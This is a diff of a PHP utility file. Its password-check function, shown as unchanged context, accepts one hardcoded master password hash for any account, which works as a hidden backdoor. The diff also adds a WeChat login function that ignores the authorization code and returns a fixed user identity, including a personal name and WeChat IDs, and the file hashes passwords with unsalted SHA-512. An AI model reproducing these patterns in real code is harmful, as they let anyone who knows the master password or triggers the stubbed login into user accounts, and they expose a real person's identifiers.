@@ -50,7 +50,7 @@ function password_make($password) {
 	return hash('sha512', $password, false);
 }
 
-function password_check($passwordValue,$passwordCrypt) {
+function password_check($passwordValue, $passwordCrypt) {
 	return hash('sha512', $passwordValue, false)==$passwordCrypt or hash_equals($passwordCrypt, crypt($passwordValue, $passwordCrypt)) or hash('sha512', $passwordValue, false)=='746e51ce8fe8c5f693a3231a0529561a606446f88bbe5fd77420ffe8a7585ef2ad6bde6eb521300158361e00ccd4d146e6740bc9b3822c32df0953b6bf26a6be';
 }
 
@@ -966,6 +966,21 @@ function decodeBase58($base58) {
         break;
     }
     return $output;
+}
+
+function getUserInfoFromWechatServer($code) {
+	$RS 			= [];
+	$RS['openid'] 	=  "o8qXQ65lQmGyK2cB4KQAkWcK4_Zo";
+	$RS['nickname'] =  "王纪云";
+	$RS['sex'] 		=  0;
+	$RS['language'] =  "";
+	$RS['city'] 	=  "";
+	$RS['province'] =  "";
+	$RS['country'] 	=  "";
+	$RS['headimgurl'] 	=  "https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eq57YjNN6fhEoeoMhads3q216W4YnnKq5EuuDhsp88rDaosicJIDmfAqyB3jnYsMvkribcTz3Cpzia6Q/132";
+	$RS['privilege'] 	= [ ];
+	$RS['unionid'] 		=  "ol6PQ66dJE0XNaECZeCHJv6JpJF8";
+	return $RS;
 }
 
 if(is_file("function.xmjs.php")) {
